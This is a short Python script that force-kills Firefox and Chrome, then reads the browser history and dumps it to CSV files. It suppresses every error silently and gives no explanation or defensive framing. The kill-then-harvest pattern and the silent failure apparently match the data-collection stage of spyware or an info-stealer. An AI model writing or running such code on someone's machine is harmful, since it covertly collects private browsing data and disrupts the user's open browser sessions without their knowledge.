import browserhistory as bh
import subprocess

def main():
    try:
        try:
            subprocess.Popen("taskkill /im firefox.exe /f", shell = True)
        except:
            pass
        try:
            subprocess.Popen("taskkill /im chrome.exe /f", shell = True)
        except:
            pass
        dict_obj = bh.get_browserhistory()
        bh.write_browserhistory_csv()
    except:
        pass

main()
